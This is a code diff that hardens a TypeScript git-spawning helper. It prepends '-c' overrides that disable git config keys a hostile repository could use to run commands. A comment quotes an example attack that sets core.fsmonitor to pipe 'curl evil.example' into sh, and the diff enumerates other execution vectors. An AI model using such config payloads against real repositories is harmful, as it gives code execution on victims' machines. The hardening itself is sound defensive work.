@@ -24,6 +24,10 @@
  * return the `string` its signature promises; pass `{ encoding: 'buffer' }` for
  * bytes.
  *
+ * Every call also gets the {@link GIT_UNTRUSTED_CONFIG_OFF} argv prefix, which
+ * neutralizes the config keys git treats as COMMANDS TO RUN. See that constant
+ * for the threat and the residual.
+ *
  * Structural guards fail CI on a regression: `git-exec.test.ts` on a new `git`
  * spawn that skips this file, and `windows-hidden-spawn-guard.test.ts` on ANY
  * subprocess spawned without `windowsHide` and without an inherited console.
@@ -37,9 +41,73 @@ import {
   type ExecFileOptions,
   type ExecFileSyncOptions,
 } from 'node:child_process';
+import { basename } from 'node:path';
 import { promisify } from 'node:util';
 
 const rawExecFileAsync = promisify(execFile);
+
+/**
+ * The argv prefix that stops an ANALYZED REPOSITORY from executing code through git.
+ *
+ * Several git config keys are not settings but command strings git runs, and git reads
+ * them from the worktree's OWN `.git/config`. Running `git status` inside a directory
+ * someone else authored is therefore arbitrary code execution as the current user:
+ *
+ *     git config core.fsmonitor 'sh -c "curl evil.example | sh; echo /dev/null"'
+ *
+ * fires on a plain `git status --porcelain` — which is exactly what `openlore analyze`
+ * runs, twice, on every invocation (`source-state.ts`). `enforce`, `drift`,
+ * `blast_radius` and `map_in_flight_conflicts` reach the same spawns. This is not a
+ * hypothetical worktree: a repo handed over as a zip/tarball, a vendored or submodule
+ * worktree, or a "here is my bug, please look" clone all ship a `.git` the author wrote.
+ *
+ * `safe.directory` does NOT cover this. It only refuses a differently-OWNED directory,
+ * so anything the developer unpacked themselves is owned by them and fully trusted.
+ *
+ * A command-line `-c` beats the repository's config file, so this prefix disables each
+ * key regardless of what the repo asked for. It is applied to every git spawn rather
+ * than to the ones that look dangerous, because which key fires depends on the repo's
+ * config and attributes, not on the subcommand we chose.
+ *
+ * RESIDUAL, stated honestly: `.gitattributes`-driven drivers — `diff.<name>.textconv`
+ * and `filter.<name>.clean/smudge` — are also command strings, and they cannot be turned
+ * off centrally because the driver NAME is chosen by the repository and `-c` has no
+ * wildcard. Commands that honor them should pass `--no-textconv` themselves. Everything
+ * git will run without an attribute opt-in is covered here.
+ */
+export const GIT_UNTRUSTED_CONFIG_OFF: readonly string[] = [
+  // Runs on `git status` / `git diff` to speed up dirty-file detection. The verified vector.
+  '-c', 'core.fsmonitor=false',
+  // Runs instead of git's internal diff, on any `git diff`.
+  '-c', 'diff.external=',
+  // Runs to page output. We never want a pager in a subprocess regardless.
+  '-c', 'core.pager=cat',
+  // Runs for any transport that shells out to ssh.
+  '-c', 'core.sshCommand=',
+  // `ext::<command>` URLs execute their argument. No remote we use needs it.
+  '-c', 'protocol.ext.allow=never',
+  // Hook directory; nothing here commits, but a future caller must not inherit one.
+  '-c', 'core.hooksPath=',
+  // Server-side hooks, reachable if a caller ever serves a repo.
+  '-c', 'uploadpack.packObjectsHook=',
+];
+
+/** True when `file` names the git binary (bare, absolute, or `.exe`). */
+function isGitBinary(file: string): boolean {
+  const base = basename(String(file)).toLowerCase();
+  return base === 'git' || base === 'git.exe';
+}
+
+/**
+ * Prepend {@link GIT_UNTRUSTED_CONFIG_OFF} to a git argv.
+ *
+ * A non-git binary routed through these helpers (for the `windowsHide` discipline alone)
+ * is passed through untouched — git's `-c` flags would be meaningless or hostile there.
+ */
+function hardenedArgs(file: string, args?: readonly string[]): string[] | undefined {
+  if (!isGitBinary(file)) return args as string[] | undefined;
+  return [...GIT_UNTRUSTED_CONFIG_OFF, ...(args ?? [])];
+}
 
 /** Promisified `execFile`, `windowsHide: true` always applied. */
 export function execFileGit(
@@ -58,7 +126,7 @@ export function execFileGit(
   options?: ExecFileOptions,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- implementation signature for the overloads above
 ): Promise<any> {
-  return rawExecFileAsync(file, args as string[], { ...options, windowsHide: true });
+  return rawExecFileAsync(file, hardenedArgs(file, args) as string[], { ...options, windowsHide: true });
 }
 
 /**
@@ -84,7 +152,7 @@ export function execFileGitSync(
   options?: ExecFileSyncOptions,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- implementation signature for the overloads above
 ): any {
-  return execFileSync(file, args, { encoding: 'utf-8', ...options, windowsHide: true });
+  return execFileSync(file, hardenedArgs(file, args), { encoding: 'utf-8', ...options, windowsHide: true });
 }
 
 /**
@@ -100,7 +168,7 @@ export const spawnGit: typeof spawn = (
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- transparent pass-through to the overloads above
   file: any, args?: any, options?: any,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- ditto
-): any => spawn(file, args, { ...(options ?? {}), windowsHide: true });
+): any => spawn(file, hardenedArgs(file, args), { ...(options ?? {}), windowsHide: true });
 
 /**
  * `spawnSync`, `windowsHide: true` always applied — for the synchronous shapes `execFileSync`
@@ -113,4 +181,4 @@ export const spawnGitSync: typeof spawnSync = (
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- transparent pass-through to the overloads above
   file: any, args?: any, options?: any,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- ditto
-): any => spawnSync(file, args, { ...(options ?? {}), windowsHide: true });
+): any => spawnSync(file, hardenedArgs(file, args), { ...(options ?? {}), windowsHide: true });
